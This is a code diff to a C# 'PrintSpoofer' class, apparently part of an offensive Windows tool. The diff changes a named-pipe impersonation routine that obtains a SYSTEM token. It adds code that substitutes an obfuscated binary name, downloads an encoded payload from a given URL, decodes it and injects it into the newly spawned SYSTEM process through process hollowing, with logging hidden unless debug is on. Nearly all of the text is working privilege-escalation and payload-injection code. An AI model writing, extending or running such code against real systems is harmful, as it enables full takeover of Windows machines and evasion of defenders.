@@ -14,14 +14,8 @@ internal static class PrintSpoofer
     const uint DEFAULT_TIMEOUT = 0;
     const uint TOKEN_ALL_ACCESS = 0xF01FF;
 
-    internal static void Spoof(string pipeName, string payloadUrl, string executeCmd = null)
+    internal static async Task Spoof(string pipeName, string payloadUrl, string executeCmd = null)
     {
-        if (executeCmd == null)
-        {
-            var currentExecutable = Environment.ProcessPath;
-            executeCmd = $"{currentExecutable} sc --payload {payloadUrl}";
-        }
-        Console.WriteLine("Will run command \"{0}\" if successful impersonation", executeCmd);
         var pipe = Lib.CreateNamedPipe(
             pipeName,
             PIPE_ACCESS_DUPLEX,
@@ -83,17 +77,34 @@ internal static class PrintSpoofer
                 var si = new STARTUPINFO();
                 si.cb = Marshal.SizeOf(si);
                 si.lpDesktop = "WinSta0\\Default";
+                var binary = string.IsNullOrEmpty(executeCmd)
+                    ? Obfuscation.GetObfuscatedBinaryName()
+                    : executeCmd;
                 Lib.CreateProcessWithTokenW(
                     hSystemToken,
                     (uint)LogonFlags.WithProfile,
                     null,
-                    executeCmd,
+                    binary,
                     (uint)CreationFlags.UnicodeEnvironment,
                     env,
                     sbSystemDir.ToString(),
                     ref si,
-                    out PROCESS_INFORMATION pi
+                    out ProcessInformation pi
                 );
+
+                if (!string.IsNullOrEmpty(payloadUrl))
+                {
+                    if (RuntimeConfig.IsDebugEnabled)
+                        Console.WriteLine($"Downloading payload from {payloadUrl}");
+                    var httpClient = new HttpClient();
+                    var data = await httpClient.GetStringAsync(payloadUrl);
+                    if (RuntimeConfig.IsDebugEnabled)
+                        Console.WriteLine($"Downloaded {data.Length} bytes");
+                    var buf = Decoder.DecodeString(data);
+                    if (RuntimeConfig.IsDebugEnabled)
+                        Console.WriteLine($"Decrypted payload to {buf.Length} bytes");
+                    await HollowProcess.Run(buf, pi);
+                }
             }
             else
             {
